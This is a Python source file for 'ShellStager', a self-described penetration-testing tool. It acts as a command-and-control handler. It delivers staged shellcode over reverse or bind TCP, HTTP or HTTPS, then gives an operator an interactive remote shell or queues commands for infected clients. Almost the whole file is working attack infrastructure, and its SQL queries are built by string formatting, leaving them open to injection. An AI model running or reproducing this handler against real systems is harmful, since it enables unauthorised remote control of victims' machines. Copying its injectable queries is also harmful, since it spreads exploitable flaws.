
from argparse import ArgumentParser
from socketserver import BaseServer, BaseRequestHandler, TCPServer
from http.server import HTTPServer, BaseHTTPRequestHandler
import importlib
import socket
import ssl
import struct
import time
import os
import sqlite3
import datetime


CONFIG_PATH = os.path.join(os.path.dirname(__file__), "configs")


class ShellTCPServerClient(TCPServer):
    def __init__(self, server_address:tuple[str, int], RequestHandlerClass:BaseRequestHandler, bind_and_activate: bool = True) -> None:
        super().__init__(server_address, RequestHandlerClass, bind_and_activate)
        self.stopped = False    # use this variable to force stop serve_forever/run_server/run_client        
    
    def run_server(self) -> None:
        while not self.stopped:
            self.handle_request()
        self.server_close()

    def run_client(self, attempts: int=10):
        self.isclient = True
        self.client_address = self.server_address # "server_address" becomes client_address
        self.server = self
        clienthandler = self.RequestHandlerClass
        self.payload = clienthandler.payload
        while not self.stopped:
            self.request = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.request.connect(self.server_address)
            clienthandler.handle(self.server)
            self.request.close()
            if attempts == 0:
                break
            attempts = attempts-1
            time.sleep(10)

        self.socket.close()
            

class ShellTCPHandler(BaseRequestHandler):
    payload = None
    def __init__(self, request, client_address, server) -> None:
        super().__init__(request, client_address, server)

    def handle(self):
        print("[*] Remote address {0} is connected at port {1}.".format(self.client_address[0], self.client_address[1]))
        self.request.send(struct.pack("<L",self.payload[1]))
        self.request.send(self.payload[0])
        print("[*] Payload sent ({0} bytes).".format(self.payload[1]))
        print("\n\n--------ShellStager---------")
        data = self.request.recv(8192).decode("utf-8")
        cmd = ""
        while True:
            cmd = input("{0}".format(data))
            if cmd.upper() == "EXIT":
                break
            elif cmd.upper() == "SHUTDOWNSERVER":
                self.server.stopped = True
                break            
            self.request.send((cmd + "\n").encode("utf-8"))
            time.sleep(0.5)
            data = self.request.recv(8192).decode("utf-8")
        print("[-] Closed Remote connection of {0}:{1}.".format(self.client_address[0], self.client_address[1]))


class ShellHTTPServer(HTTPServer):
    def __init__(self, server_address: tuple[str, int], RequestHandlerClass: BaseHTTPRequestHandler, bind_and_activate: bool) -> None:
        super().__init__(server_address, RequestHandlerClass, bind_and_activate)
        self.last_get = False    # flag to send shutdown command to the client
        self.stopped = False     # use this variable to force stop serve_forever/keep_running
        self.queue_ready = False # variable for setting up a Queueing database

    def keep_running(self, poll_interval: float = 0.5) -> None:
        if not self.queue_ready:
            self.init_queuedb()
            self.queue_ready = True

        while not self.stopped:
            self.handle_request()

        self.server_close()

    def init_queuedb(self):
        self.module_dir = os.path.dirname(__file__)
        self.dbfile = os.path.join(CONFIG_PATH, "queue.db")
        self.db = None
        self.dbcursor = None
        # always create Queue DB
        open(os.path.join(self.module_dir, self.dbfile), "wb")
        self.db = sqlite3.connect(os.path.join(self.module_dir, self.dbfile))
        self.dbcursor = self.db.cursor()
        self._createdb()

    def _createdb(self):
        self.dbcursor.execute('''
            CREATE TABLE client(
                id TEXT NOT NULL UNIQUE,
                ip TEXT NOT NULL,
                port INTEGER,
                timedate TEXT
            )
        ''')
        self.dbcursor.execute('''
            CREATE TABLE command(
                id TEXT NOT NULL UNIQUE,
                ip TEXT,
                port INTEGER,
                cmd TEXT,
                status TEXT,
                result TEXT,
                exec_time TEXT,
                end_time TEXT               
            )
        ''')
        self.dbcursor.execute('''
            CREATE TABLE history(
                id TEXT,
                ip TEXT,
                port INTEGER,
                cmd TEXT,
                status TEXT,
                result TEXT,
                exec_time TEXT,
                end_time TEXT               
            )
        ''')
        self.db.commit()


class ShellHTTPHandler(BaseHTTPRequestHandler):
    payload = None
    def __init__(self, request: bytes, client_address: tuple[str, int], server: BaseServer) -> None:
        super().__init__(request, client_address, server)

    def _sanitize_cmd_input(g):
        a = g.split("~")
        cmd = ""
        # find empty strings
        # if found, the next element is part of it
        found = False
        for n in range(len(a)):
            if a[n] == "":
                found = True
                continue
            
            if found:
                cmd = "{0}~{1}".format(cmd, a[n])
        # this means, that the valid
        # input is the last element
        if cmd == "":
            cmd = a[-1]

        return cmd

        
    def _send_response(self, httpresponse, payload, content_type):
        # send response to client
        self.send_response(httpresponse)
        self.send_header("Content-type", content_type)
        self.end_headers()
        # self.wfile.write(struct.pack("<L",len(pload)))
        self.wfile.write(payload)

    
    def log_message(self, format: str, *args) -> None:
        return None


    def register(self, id, ip, port):
        self.server.dbcursor.execute('''
            INSERT OR IGNORE INTO client (id, ip, port, timedate) 
            VALUES ('{0}', '{1}', {2}, '{3}')
        '''.format(id, ip, port, datetime.datetime.now()))
        self.server.db.commit()


    def exec_query(self, query):
        return self.server.dbcursor.execute('''
            {0}
        '''.format(query))


    def do_GET(self):
        try:
            payload = None
            if self.server.last_get:
                self._send_response(200, b"\xFF", "application/octet-stream")
                self.server.stopped = True
                return 
            # the following line can be used as debug log
            # print("[+] {0}:{1} connected.".format(self.client_address[0], self.client_address[1]))
            if len(self.path) > 5 and not self.path.upper().startswith("/CMD_"):
                # register client
                id = self.path.upper().replace("/","")
                self.register(id, self.client_address[0], int(self.client_address[1]))
                print("[+] {0}:{1} registered with ID:{2}.".format(self.client_address[0], self.client_address[1], id))
                # send shellstager payload
                self._send_response(200, self.payload[0], "application/octet-stream")
                print("[+] Payload sent ({0} bytes) to {1}:{2}.".format(self.payload[1], self.client_address[0], self.client_address[1]))

            elif self.path.upper().startswith("/CMD_"):
                # check if already registered
                id = self.path.upper().replace("/CMD_","")
                res = self.exec_query('''
                    SELECT id FROM client
                    WHERE id='{0}'
                '''.format(id))
                isregistered = False
                for r in res:
                    if r != None:
                        # already registered
                        isregistered = True
                        break
                
                if not isregistered:
                    # send HTTP 404
                    self._send_response(404, b"1", "text/html")
                    print("[-] {0}:{1} - UNKNOWN CLIENT".format(self.client_address[0], self.client_address[1]))
                    # register client
                    self.register(id, self.client_address[0], int(self.client_address[1]))
                    print("[+] {0}:{1} registered with ID:{2}.".format(self.client_address[0], self.client_address[1], id))
                    

                else: 
                    # already registered
                    # query if there's command available
                    res = self.exec_query('''
                        SELECT cmd FROM command WHERE id='{0}' AND status='WAITING'
                    '''.format(id))
                    for r in res:
                        if r != None:
                            payload = bytes(r[0], "utf-8") # convert string to bytes
                            break
                    if payload == None:
                        # send response to the client
                        self._send_response(200, b"1", "text/html")
                        # initiate User Input
                        self.cmd_prompt(id)
                    else:
                        self._send_response(200, payload, "application/octet-stream")

        except ConnectionResetError:
            pass
        except Exception as e:
            print("[X] ERROR: {0}".format(e))
            

    def do_POST(self):
        try:
            if self.path.upper().startswith("/CMD_"):
                id = self.path.upper().replace("/CMD_","")
                datalen = self.headers["Content-Length"]
                data = self.rfile.read(int(datalen)).decode()
                if data.upper().startswith("OUT="):
                    # send response to the client
                    self._send_response(200, b"1", "text/html")

                    # Show Command Output to STDOUT
                    print(data[4:])
                    # write the shell output to command table
                    self.exec_query('''
                        UPDATE command 
                        SET status="DONE",
                            result="{0}",
                            end_time="{1}"
                        WHERE id="{2}"
                    '''.format(data[4:], datetime.datetime.now(), id))
                    self.server.db.commit()
                    
                    # move the data to History table
                    res = self.exec_query('''
                        SELECT * FROM command WHERE id="{0}" AND status="DONE"
                    '''.format(id))
                    for r in res:
                        # write data to history table
                        self.exec_query('''
                            INSERT INTO history (id, ip, port, cmd, exec_time, end_time)
                            VALUES ("{0}", "{1}", "{2}", "{3}", "{4}", "{5}") 
                        '''.format(r[0], r[2], r[3], r[1], r[4], r[5]))
                        self.server.db.commit()
                    # delete all DONE status from command table
                    self.exec_query('''
                        DELETE FROM command WHERE id="{0}" AND status="DONE"
                    '''.format(id))
                    self.server.db.commit()
                # # TODO
                # elif data.upper().startswith("UPLOAD="):
                #     pass

                # elif data.upper().startswith("DOWNLOAD="):
                #     pass
        
        except ConnectionResetError:
            pass
        except Exception as e:
            print("[X] ERROR: {0}".format(e))


    def cmd_prompt(self, id):
        allowed_commands = [
            "dir".upper(),
            "rmdir".upper(),
            "copy".upper(),
            "del".upper(),
            "ver".upper(),
            "systeminfo".upper(),
            "ipconfig".upper(),
            "wmic".upper()
        ]
        try:
            cmd = input("$ ShellStager> ")
            if ord(cmd[0]) < 0x20:
                cmd = self._sanitize_cmd_input(cmd)
            
            # check immediately if EXIT command
            if cmd.upper() == "EXIT":
                self.server.last_get = True
                # self.server.stopped = True
                print("[-] ShellStager console exited. User-initiated.")
            
            else: # process the command
                allowed_cmd_flag = False
                for n in allowed_commands:
                    if cmd.upper().startswith(n):
                        allowed_cmd_flag = True
                        break

                if not allowed_cmd_flag:
                    print("[X] ERROR: Unknown command.")
                    raise ConnectionResetError
                
                else:
                    #write command to the queue db
                    self.exec_query('''
                        INSERT OR IGNORE INTO command (id, cmd, ip, port, status, exec_time) 
                        VALUES ('{0}', '{1}', '{2}', {3}, 'WAITING', '{4}') 
                    '''.format(id, cmd, self.client_address[0], int(self.client_address[1]), datetime.datetime.now()))
                    self.server.db.commit()
               
        except ConnectionResetError:
            pass

        except KeyboardInterrupt:
            if not self.server.stopped:
                print(" -> Exiting..")
                self.server.stopped = True

        except Exception as e:
            print("[X] ERROR: {0}".format(e))



class ShellHandlerCaller(object):
    def tcpserver(self, host, port, payload, is_reverse=True):
        reverse_str = ""
        server_client = None
        try:
            if is_reverse:
                reverse_str = "Reverse "
            print("[*] Started {0}TCP handler for {1}:{2}".format(reverse_str, host, port))
            ShellTCPHandler.payload = payload
            handler = ShellTCPHandler
            server_client = ShellTCPServerClient((host, port), handler, is_reverse)
            if not is_reverse: # Run as Client
                server_client.run_client()
                
            else: # Run as TCP Server
                server_client.run_server()

        except KeyboardInterrupt:
            print("\n[-] User pressed Ctrl+Break.")

        except Exception as e:
            print("[X] ERROR: {0}".format(e))

        #--------EXITING--------
        # close server/client socket
        print("[*] Shutting down {0}TCP handler.".format(reverse_str))
        if server_client != None:
            if is_reverse:
                server_client.socket.close()
            else:
                server_client.server_close()

    
    def httpserver(self, host, port, payload, https=False):
        # HTTP Handler for remote connections
        httpd = None
        http_string = "HTTP"
        try:
            ShellHTTPHandler.payload = payload
            handler = ShellHTTPHandler            
            httpd = ShellHTTPServer((host, port), handler, True)
            if https:
                http_string = "HTTPS"
                httpd.socket = ssl.wrap_socket(httpd.socket, 
                                               keyfile=os.path.join(CONFIG_PATH, "key.pem"),  
                                               certfile=os.path.join(CONFIG_PATH, "cert.pem"), 
                                               server_side=True,
                                               ssl_version=ssl.PROTOCOL_TLS)
            
            print("[*] Started {0} Server {1}:{2}".format(http_string, host, port))
            httpd.keep_running()

        except ConnectionResetError:
            pass            
        except KeyboardInterrupt:
            print("\n[*] Shutting down {0} server.".format(http_string))
        except Exception as e:
            print("[X] ERROR: {0}".format(e))
        
        #--------EXITING--------
        # HTTP server cleanup
        if httpd != None:
            httpd.server_close()


def load_payload(name):
    sctype = None
    stage = None
    stager = None
    modpath = None
    fname = name.split(os.path.sep)
    if len(fname) == 3:
        sctype = "single"
        modname = fname[-1]
        stage = modname.split("_")[0]
        stager = "_".join(modname[1:])
        modpath = os.path.join("payloads", "{0}s".format(sctype), name)
    elif len(fname) == 4:
        # Get the stager of the staged shellcode
        # e.g. windows/x86/shell/reverse_tcp
        # stage: shell, stager/modname: reverse_tcp
        sctype = "stage"
        stage = fname[-2]
        stager = fname[-1]
        modpath = os.path.join("payloads", "{0}s".format(sctype), os.path.dirname(name))
    else:
        print("[X] ERROR: Invalid Payload path format. Payload: <platform>/<arch>/<stage_name>/<stager_name>")
        return

    modpath = modpath.replace(os.path.sep, ".")
    mod = None
    mod = importlib.import_module(modpath)
    # Check if stager is valid configuration of this staged shellcode
    pinst = mod.__getattribute__(stage)()
    found = False
    for s in pinst.stagers:
        if s.upper() == stager.upper():
            found = True
            break
    
    if not found:
        raise Exception("{0} does not have {1} stager.".format(stage, stager))
        
    else:
        return mod, pinst, stager



def parse_handler_cmd():
    args = None
    try:
        parser = ArgumentParser(description="ShellStager - tool for penetration testing.")
        subparsers = parser.add_subparsers()
        schandler = subparsers.add_parser("run", help="Run a Service to handle communication.")
        schandler.add_argument("--payload", required=True, help="Payload full path. Example: windows/x86/stagers/reverse_tcp")
        schandler.add_argument("--host", default="127.0.0.1", help="Target host machine.")
        schandler.add_argument("--port", default=4444, type=int, help="Port number.")
        args = parser.parse_args()

    except Exception as e:
        print("[X] ERROR: {0}".format(e))

    return args, parser


def main():
    try:
        args, parser = parse_handler_cmd()
        mod, pinst, stager = load_payload(args.payload)
        mod.HOST = args.host
        mod.PORT = args.port
        mod.FORMAT = "raw"
        mod.CURRENT_STAGER = stager
        payload = pinst.build_shellcode()
                
        shc = ShellHandlerCaller()
        if stager.upper().startswith("REVERSE") and "REVERSE_TCP" in stager.upper():
            shc.tcpserver(args.host, args.port, payload, True)
        elif stager.upper().startswith("BIND") and "BIND_TCP" in stager.upper():
            shc.tcpserver(args.host, args.port, payload, False)
        elif stager.upper().startswith("REVERSE") and  stager.upper().endswith("REVERSE_HTTP"):
            shc.httpserver(args.host, args.port, payload, False)
        elif stager.upper().startswith("REVERSE") and stager.upper().endswith("REVERSE_HTTPS"):
            shc.httpserver(args.host, args.port, payload, True)

    except Exception as e:
        print("[X] ERROR: {0}".format(e))


if __name__ == "__main__":
    main()